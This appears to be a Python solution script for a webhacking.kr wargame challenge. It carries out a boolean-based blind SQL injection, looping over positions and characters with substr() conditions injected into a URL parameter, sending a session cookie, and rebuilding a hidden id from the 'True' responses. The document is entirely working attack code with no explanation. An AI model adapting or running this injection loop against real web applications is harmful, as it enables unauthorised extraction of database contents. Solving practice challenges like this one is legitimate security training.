import urllib.request



arr="zmxncbvalskdjfhgpqwoeiruty654738290"
flag=""
for x in range(1,6):
	for y in arr:
			url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?no=1 and substr(id,{first},1)='{second}'".format(first=x,second=y)
			# url = 'http://naver.com'
			request = urllib.request.Request(url)
			request.add_header("Cookie","PHPSESSID=1620a37eda8b69f8661ea3b428e9c73b")
			print(url)
			data = urllib.request.urlopen(request).read().decode("utf-8")
			if data.find('True') != -1:
				print("first :",x,"   second :",y)
				flag+=y
print(request)